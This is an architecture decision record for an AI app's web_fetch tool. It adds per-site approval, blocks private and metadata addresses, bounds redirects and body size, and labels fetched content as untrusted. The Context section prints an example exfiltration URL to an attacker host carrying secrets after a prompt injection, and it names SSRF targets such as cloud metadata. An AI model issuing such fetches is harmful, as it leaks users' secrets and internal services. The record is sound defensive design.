# 0007. web_fetch asks per site and never reaches private addresses

- Status: Accepted
- Date: 2026-10-21

## Context

`web_fetch` ran unasked under every policy and fetched anything:

- `http://localhost` services, cloud metadata at `169.254.169.254`, or the user's router.
- `https://attacker.example/?d=<secrets>` straight after a prompt injection.

It followed any redirect, read unbounded bodies and had no timeout. A URL is an exfiltration
channel even when the response is ignored.

## Decision

- **Approval per site.** The first fetch from each host in a session asks, in every mode and
  under every policy but Full access. Approving allows that host until the session ends.
  Subagents share the list.
- **Public addresses only.** `@encode/permissions/egress` decides what counts as public.
  - Refused ranges: private, loopback, link-local, CGNAT, multicast, documentation and the
    other special-purpose ones. This includes IPv4 inside mapped, NAT64 and 6to4 IPv6 forms,
    and any non-canonical spelling of an address.
  - `electron/services/web.ts` checks every address a name resolves to when it connects, so
    DNS rebinding cannot swap in a private address after the check.
- **Bounded fetches.**
  - Only `http` and `https` URLs without credentials are fetched.
  - Redirects are followed only on the same host: at most 5, never https to http. A redirect
    to another site comes back to the model, so it goes through approval as a new fetch.
  - Binary bodies are skipped.
  - Decompression is capped at 2 MB, which covers compression bombs.
  - Requests time out after 30 s.
- **Untrusted content is labeled.** Fetch and search results arrive inside
  `<untrusted_web_content>`. The system prompt tells the model to use them as information
  and never to follow instructions found there.

## Consequences

- One click per new site, and a reason on the card that explains why.
- The fetcher cannot reach local development servers. The smoke relies on this: its
  `localhost` fetch is approved and then refused by the address check.
- Labeling reduces prompt injection but does not prevent it. Approvals and policies remain
  the control, and the threat model tracks the residual risk.
